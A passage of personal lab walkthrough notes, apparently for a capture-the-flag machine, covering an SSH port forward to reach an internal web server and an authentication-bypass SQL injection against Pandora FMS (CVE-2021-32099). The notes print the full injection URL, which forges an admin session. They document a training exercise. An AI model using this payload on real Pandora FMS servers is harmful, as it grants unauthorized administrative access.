- Once logged in as daniel, checking /var/www shows a second web server that cannot be accessed from the internet
- Set up a port forward to be able to access the machine
```bash
ssh -L 8000:localhost:80  daniel@10.10.11.136
```
- Now should be able to access the server from localhost:8000
![[Pasted image 20220127155746.png]]

## SQLi
Do some research on this version of Pandora FMS found in a config file and see there is an auth bypass SQLi
https://github.com/ibnuuby/CVE-2021-32099
Using this payload:
*[http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271](http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271)*
and go back to beggining page to access the home screen
![[Pasted image 20220420231421.png]]